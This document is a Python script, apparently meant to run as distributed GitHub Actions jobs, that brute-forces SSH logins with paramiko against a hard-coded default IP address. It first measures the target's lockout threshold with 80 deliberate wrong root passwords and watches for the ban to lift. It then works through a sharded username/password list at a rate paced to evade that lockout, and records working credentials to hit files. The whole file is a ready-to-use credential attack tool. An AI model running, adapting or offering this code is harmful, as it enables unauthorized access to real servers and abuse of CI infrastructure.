#!/usr/bin/env python3
# ARTEX i4103 - GH Actions SSH calibration / brute runner
import os, sys, time, json, socket, random
from datetime import datetime, timezone

HOST = os.environ.get('TARGET_HOST', '154.222.19.143').strip()
PORT = int(os.environ.get('TARGET_PORT', '22'))
MODE = os.environ.get('MODE', 'calib').strip()
COMBO_FILE = os.environ.get('COMBO_FILE', 'calib_combos.txt')
GLOBAL_OFFSET = int(os.environ.get('GLOBAL_OFFSET', '0'))
GLOBAL_END = int(os.environ.get('GLOBAL_END', '0'))
SHARD = int(os.environ.get('SHARD', '0'))
NSHARD = int(os.environ.get('NSHARD', '1'))
RATE = float(os.environ.get('RATE', '8'))
MAXSEC = int(os.environ.get('MAXSEC', '1500'))
MAXN = int(os.environ.get('MAXN', '100000000'))
DONE_FILE = os.environ.get('DONE_FILE', 'done_all.txt')
ARTI = os.environ.get('ARTI', '.')
RUNNER = os.environ.get('RUNNER_NAME', 'unknown')


def ts():
    return datetime.now(timezone.utc).strftime('%H:%M:%SZ')


def log(*a):
    print(*a, flush=True)


def src_ip():
    try:
        import urllib.request
        return urllib.request.urlopen('https://api.ipify.org', timeout=10).read().decode().strip()
    except Exception as e:
        return 'IPERR:%s' % type(e).__name__


def read_banner(timeout=15.0):
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.settimeout(timeout)
        data = s.recv(512)
        s.close()
        return 'BANNER:%r elapsed=%.2fs' % (data[:200], time.time() - t0)
    except Exception as e:
        return 'BANNER_ERR:%s:%s elapsed=%.2fs' % (type(e).__name__, str(e)[:100], time.time() - t0)


def try_auth(user, pw, timeout=12.0):
    t0 = time.time()
    import paramiko
    cl = None
    try:
        cl = paramiko.SSHClient()
        cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cl.connect(HOST, port=PORT, username=user, password=pw,
                   timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
                   allow_agent=False, look_for_keys=False)
        return ('OK', round(time.time() - t0, 2), '')
    except paramiko.AuthenticationException as e:
        return ('AUTH_FAIL', round(time.time() - t0, 2), str(e)[:120])
    except Exception as e:
        return ('ERR', round(time.time() - t0, 2), type(e).__name__ + ':' + str(e)[:160])
    finally:
        if cl is not None:
            try:
                cl.close()
            except Exception:
                pass


def load_combos(path):
    out = []
    with open(path, 'r', errors='replace') as f:
        for line in f:
            line = line.rstrip('\n')
            if not line or '|' not in line:
                continue
            u, p = line.split('|', 1)
            out.append((u, p))
    return out


def calib():
    log('=== CALIB START %s runner=%s host=%s:%d ===' % (ts(), RUNNER, HOST, PORT))
    log('SRC_IP:', src_ip())
    log('BANNER1:', read_banner())
    combos = load_combos(COMBO_FILE)
    log('COMBOS loaded:', len(combos))
    ok = 0
    fail = 0
    err = 0
    durations = []
    t_start = time.time()
    for i, (u, p) in enumerate(combos[:30]):
        r = try_auth(u, p)
        log('CALIB %02d user=%s res=%s %.2fs %s' % (i, u, r[0], r[1], r[2]))
        durations.append(r[1])
        if r[0] == 'OK':
            ok += 1
            log('AUTH_OK %s|%s' % (u, p))
        elif r[0] == 'AUTH_FAIL':
            fail += 1
        else:
            err += 1
        time.sleep(0.2)
    el = time.time() - t_start
    log('CALIB_SUMMARY ok=%d fail=%d err=%d elapsed=%.2f auth_per_s=%.3f avg_lat=%.2f' %
        (ok, fail, err, el, len(combos[:30]) / max(el, 0.01), sum(durations) / max(len(durations), 1)))

    # 80 consecutive failures ban probe
    log('=== FAILPROBE 80 consecutive wrong creds ===')
    fp_start = time.time()
    seq = []
    ban_at = None
    for i in range(80):
        r = try_auth('root', 'kf_calib_wrong_%04d' % i)
        seq.append((i, r[0], r[1], r[2]))
        log('FAILPROBE %02d res=%s %.2fs %s' % (i, r[0], r[1], r[2]))
        if r[0] != 'AUTH_FAIL':
            if ban_at is None:
                ban_at = i
            log('BAN_SIGNAL at attempt %d: %s' % (i, r[0]))
        time.sleep(0.15)
    log('FAILPROBE_SUMMARY n=80 elapsed=%.1fs auth_per_s=%.3f ban_at=%s' %
        (time.time() - fp_start, 80 / max(time.time() - fp_start, 0.01), ban_at))

    # post-ban watch: try every 30s up to 12 min, detect recovery
    log('=== UNBAN WATCH start %s ===' % ts())
    for j in range(24):
        time.sleep(30)
        r = try_auth('root', 'kf_calib_after_%d' % j)
        log('AFTER %02d %s res=%s %.2fs %s' % (j, ts(), r[0], r[1], r[2]))
        if ban_at is not None and r[0] == 'AUTH_FAIL':
            log('RECOVERED at watch %d (%ds after ban signal)' % (j, (j + 1) * 30))
            break
    log('=== CALIB DONE %s ===' % ts())


def brute():
    import heapq
    log('=== BRUTE START %s runner=%s host=%s:%d shard=%d/%d offset=%d end=%d rate=%.2f maxsec=%d ===' %
        (ts(), RUNNER, HOST, PORT, SHARD, NSHARD, GLOBAL_OFFSET, RATE, MAXSEC))
    log('SRC_IP:', src_ip())
    log('BANNER:', read_banner())
    done = set()
    if os.path.exists(DONE_FILE):
        with open(DONE_FILE, 'r', errors='replace') as f:
            for line in f:
                line = line.strip()
                if line:
                    done.add(line)
    log('DONE_SET:', len(done))
    t0 = time.time()
    idx = -1
    attempted = 0
    fails = 0
    errs = 0
    consec_err = 0
    hits = []
    progress_path = os.path.join(ARTI, 'progress_%d.txt' % SHARD)
    hits_path = os.path.join(ARTI, 'hits_%d.txt' % SHARD)

    def write_progress(extra=''):
        with open(progress_path, 'w') as pf:
            pf.write(json.dumps({'shard': SHARD, 'attempted': attempted, 'fails': fails, 'errs': errs,
                                 'last_index': idx, 'elapsed': round(time.time() - t0, 1),
                                 'rate': round(attempted / max(time.time() - t0, 0.01), 3),
                                 'hits': hits, 'ts': ts(), 'extra': extra}))

    with open(COMBO_FILE, 'r', errors='replace') as f:
        for line in f:
            idx += 1
            if idx < GLOBAL_OFFSET:
                continue
            if GLOBAL_END and idx >= GLOBAL_END:
                break
            if idx % NSHARD != SHARD:
                continue
            line = line.rstrip('\n')
            if not line or '|' not in line:
                continue
            if line in done:
                continue
            if attempted >= MAXN:
                break
            if time.time() - t0 > MAXSEC:
                log('MAXSEC reached at idx=%d attempted=%d' % (idx, attempted))
                break
            u, p = line.split('|', 1)
            r = try_auth(u, p)
            attempted += 1
            if r[0] == 'OK':
                hits.append(line)
                log('AUTH_OK %s' % line)
                with open(hits_path, 'a') as hf:
                    hf.write(line + '\n')
            elif r[0] == 'AUTH_FAIL':
                fails += 1
                consec_err = 0
            else:
                errs += 1
                consec_err += 1
                log('ERR idx=%d %s %s' % (idx, r[0], r[2]))
            if attempted % 200 == 0:
                write_progress()
                log('PROGRESS shard=%d attempted=%d fails=%d errs=%d idx=%d rate=%.2f/s' %
                    (SHARD, attempted, fails, errs, idx, attempted / max(time.time() - t0, 0.01)))
            if consec_err >= 25:
                log('ABORT: 25 consecutive network errors at idx=%d' % idx)
                write_progress('abort_consec_err')
                return
            # pacing
            target = t0 + attempted / max(RATE, 0.01)
            dt = target - time.time()
            if dt > 0:
                time.sleep(dt)
            elif dt < -30:
                t0 = time.time() - attempted / max(RATE, 0.01)
    write_progress('done')
    log('BRUTE_DONE shard=%d attempted=%d fails=%d errs=%d hits=%d elapsed=%.1f' %
        (SHARD, attempted, fails, errs, len(hits), time.time() - t0))
    log('HITS_JSON:' + json.dumps(hits))


if __name__ == '__main__':
    if MODE == 'calib':
        calib()
    else:
        brute()
